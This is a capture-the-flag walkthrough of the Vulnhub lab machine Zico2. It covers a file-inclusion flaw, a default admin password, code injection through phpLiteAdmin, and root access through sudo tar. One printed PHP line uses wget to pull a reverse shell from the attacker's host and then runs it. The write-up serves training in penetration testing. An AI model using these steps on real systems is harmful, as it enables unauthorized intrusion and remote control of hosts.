# Zico2 - Writeup

Zico is an intermediate level machine from Vulnhub by Rafael.<br />
Our goal is to get root and read the flag file.
<br />

The description says: "Zico is trying to build his website but is having some trouble in choosing what CMS to use. After some tries on a few popular ones, he decided to build his own. Was that a good idea?
Hint: Enumerate, enumerate, and enumerate!"

Link to the machine: [https://www.vulnhub.com/entry/zico2-1,210/](https://www.vulnhub.com/entry/zico2-1,210/) 

<br />

## Target discovery

First, let's identify our target's IP address.

```
fping -agq 10.10.10.0/24

10.10.10.1
10.10.10.2
10.10.10.10
```
<br />

## Scanning The Target

Scan our target for any open ports, running services, services version, and OS detection.

![](Pics/nmap.png)
<br />
<br />

There're four open ports.

<br />

## Web Enumeration

Starting with the web server, runs gobuster while we manually examine the webpage.

![](Pics/web.png)
<br />
<br />

No clues, and nothing useful in the source code.<br />

Let's look back on gobuster result.

![](Pics/gob.png)
<br />
<br />

Ok, there're two interesting directories, `/view.php`, and `/dbadmin`, let's check "dbadmin".

![](Pics/web2.png)
<br />
<br />

We have `test_db.php` which is a login page to SQLite database admin panel.

![](Pics/web3.png)
<br />
<br />

Searching for known exploits for this version.

![](Pics/search.png)
<br />
<br />

There's one that allows us to remote inject php code but after authentication. We'll be back to it.<br />
Inspecting `View.php`, when adding `?` to `view.php` it calls `page=tools.html`.

![](Pics/web4.png)
<br />
<br />

Testing it against `LFI`, and it's vulnerable.

![](Pics/web5.png)
<br />
<br />

Nice! but, how do we use it?<br />
Anyway, back to "phpLiteAdmin" and searching for common, default passwords and guess what? 
It's `admin`.

![](Pics/default.png)
<br />
<br />

Logged in.

![](Pics/cms.png)
<br />
<br />

Click on the table `info` from `test_users` database, and two rows show up.

![](Pics/cms2.png)
<br />
<br />

Let's crack them.

![](Pics/crack.png)
<br />
<br />

Tried to log in with SSH but didn't work.
<br />

## Getting access

Back to our exploit.

![](Pics/exp.png)
<br />
<br />

Following the steps, with little modification. First, create a database named `hack.php`.

![](Pics/db.png)
<br />
<br />

Now, create a new table by clicking on the created database.

![](Pics/db2.png)
<br />
<br />

Add a php code that will download a reverse shell from our machine, and then execute it.<br />
`<?php system("wget 10.10.10.2:8080/revshell.php -O /tmp/revshell.php; php /tmp/revshell.php"); ?>`

![](Pics/db3.png)
<br />
<br />

Download a php reverse shell [https://pentestmonkey.net/tools/web-shells/php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell), or on kali: `/usr/share/webshells/php/php-reverse-shell.php`.<br />
Just remember to change the port and ip address.

![](Pics/shell.png)
<br />
<br />

Open an HTTP server where your reverse shell is, and open a listener.

![](Pics/shell2.png)
<br />
<br />

We will use the `LFI` we found in `view.php` to trigger our php code.

![](Pics/shell3.png)
<br />
<br />

Upgrade our shell. 
> Reference: [https://infosecwriteups.com/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2](https://infosecwriteups.com/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2).

![](Pics/shell4.png)
<br />
<br />

## Privilege Escalation

Start enumeration to escalate our privileges.
Under `Ziko`'s directory, there're three CMS files.

![](Pics/shell5.png)
<br />
<br />

Under `WordPress`, there's `wp-config.php` which contains `zico`'s credentials, tried to ssh.

![](Pics/user.png)
<br />
<br />

## root access

Checking for sudo permission.

![](Pics/user2.png)
<br />
<br />

We can run `tar` and `zip` with root privilege without any password.<br />
On [gtfobins](https://gtfobins.github.io/gtfobins/tar/), we could abuse `tar` to escalate our privileges to root. 

![](Pics/root.png)
<br />
